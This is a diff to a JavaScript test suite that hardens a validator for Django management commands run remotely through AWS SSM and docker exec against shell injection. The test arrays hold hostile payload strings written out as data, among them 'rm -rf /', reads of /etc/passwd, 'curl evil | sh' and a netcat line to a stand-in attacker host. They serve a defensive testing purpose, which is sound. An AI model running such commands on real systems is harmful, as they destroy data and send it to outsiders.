@@ -484,6 +484,47 @@ describe("validateManageCommand", () => {
     assert.throws(() => validateManageCommand("custom_thing"), /Unknown/);
     assert.throws(() => validateManageCommand("makemigrations"), /Unknown/);
   });
+
+  it("rejects an empty or whitespace-only command", () => {
+    assert.throws(() => validateManageCommand(""), /Empty/);
+    assert.throws(() => validateManageCommand("   "), /Empty/);
+  });
+
+  it("rejects shell-control syntax in any token (issue #1176)", () => {
+    const payloads = [
+      "check; rm -rf /",
+      "check && rm -rf /",
+      "check | cat /etc/passwd",
+      "check $(id)",
+      "check `id`",
+      "check > /tmp/out",
+      "check < /etc/passwd",
+      "check &",
+      "check --deploy; touch /tmp/pwn",
+      "check ;ls",
+      "check '; rm -rf /; echo '",
+      'check "quoted"',
+      "check #comment",
+      "check *",
+      "check\n; rm -rf /",
+    ];
+    for (const p of payloads) {
+      assert.throws(
+        () => validateManageCommand(p),
+        /disallowed characters or shell syntax/,
+        `expected rejection for: ${JSON.stringify(p)}`,
+      );
+    }
+  });
+
+  it("does not echo the rejected payload in the error message", () => {
+    try {
+      validateManageCommand("check; secret-token-value");
+      assert.fail("expected a throw");
+    } catch (e) {
+      assert.doesNotMatch(e.message, /secret-token-value/);
+    }
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -887,10 +928,10 @@ describe("buildSsmSendCommandArgs", () => {
 });
 
 describe("buildRunManageArgs", () => {
-  it("wraps the management command in docker-exec inside the SSM JSON parameters", () => {
+  it("renders the fixed docker-exec wrapper from validated argv", () => {
     const argv = buildRunManageArgs({
       targetId: "i-deadbeef",
-      command: "showmigrations",
+      commandParts: ["showmigrations"],
     });
     assert.equal(argv[0], "ssm");
     assert.equal(argv[1], "send-command");
@@ -902,21 +943,92 @@ describe("buildRunManageArgs", () => {
     });
   });
 
-  it("preserves user metacharacters inside the docker-exec command (single argv element)", () => {
+  it("joins multi-token argv into the fixed wrapper", () => {
     const argv = buildRunManageArgs({
       targetId: "i-deadbeef",
-      command: "check; touch /tmp/pwn $(id)",
+      commandParts: ["check", "--deploy"],
     });
     const parameters = argv[argv.indexOf("--parameters") + 1];
-    const parsed = JSON.parse(parameters);
-    assert.deepEqual(parsed, {
-      commands: [
-        "docker exec portal python manage.py check; touch /tmp/pwn $(id)",
-      ],
+    assert.deepEqual(JSON.parse(parameters), {
+      commands: ["docker exec portal python manage.py check --deploy"],
     });
-    // The whole JSON payload is still one argv element — never split
-    // by spaces, never re-evaluated by the local shell.
-    assert.equal(typeof argv[argv.indexOf("--parameters") + 1], "string");
+  });
+
+  it("rejects any argv element carrying shell metacharacters (defense in depth)", () => {
+    const badParts = [
+      ["check", "$(id)"],
+      ["check", ";", "rm"],
+      ["check", "&&rm"],
+      ["check", "`id`"],
+      ["check", ">/tmp/x"],
+      ["check", "|cat"],
+      ["check", "a b"],
+    ];
+    for (const parts of badParts) {
+      assert.throws(
+        () => buildRunManageArgs({ targetId: "i-a", commandParts: parts }),
+        /disallowed characters or shell syntax/,
+        `expected rejection for: ${JSON.stringify(parts)}`,
+      );
+    }
+  });
+
+  it("rejects an empty or non-array argv", () => {
+    assert.throws(
+      () => buildRunManageArgs({ targetId: "i-a", commandParts: [] }),
+      /Empty/,
+    );
+    assert.throws(
+      () => buildRunManageArgs({ targetId: "i-a", commandParts: "check" }),
+      /Empty/,
+    );
+  });
+});
+
+// ---------------------------------------------------------------------------
+// run_manage_command remote-shell injection resistance (issue #1176)
+//
+// The allowlist historically validated only the first whitespace-delimited
+// token, then the raw command string was concatenated into a
+// `docker exec ... manage.py <command>` invocation run by a *remote*
+// AWS-RunShellScript shell. These tests assert that the validate->render
+// pipeline rejects shell-control syntax before any SSM argv is built, and
+// that a benign command renders exactly the fixed wrapper.
+// ---------------------------------------------------------------------------
+describe("run_manage_command injection resistance (issue #1176)", () => {
+  const INJECTIONS = [
+    "check; rm -rf /",
+    "check && curl evil | sh",
+    "check $(id)",
+    "check `id`",
+    "showmigrations > /tmp/out",
+    "check | nc attacker 1",
+    "check\n; rm -rf /",
+    "check '; rm -rf /; echo '",
+  ];
+
+  it("rejects every injection payload before SSM argv is built", () => {
+    for (const payload of INJECTIONS) {
+      assert.throws(
+        () => {
+          const parts = validateManageCommand(payload);
+          buildRunManageArgs({ targetId: "i-a", commandParts: parts });
+        },
+        /disallowed characters or shell syntax/,
+        `expected rejection for: ${JSON.stringify(payload)}`,
+      );
+    }
+  });
+
+  it("emits only the fixed wrapper plus validated argv for a benign command", () => {
+    const parts = validateManageCommand("check --deploy");
+    const argv = buildRunManageArgs({ targetId: "i-a", commandParts: parts });
+    const parameters = argv[argv.indexOf("--parameters") + 1];
+    assert.deepEqual(JSON.parse(parameters).commands, [
+      "docker exec portal python manage.py check --deploy",
+    ]);
+    // No shell-control characters survive into the SSM parameters.
+    assert.doesNotMatch(parameters, /[;&|`$><]/);
   });
 });
 
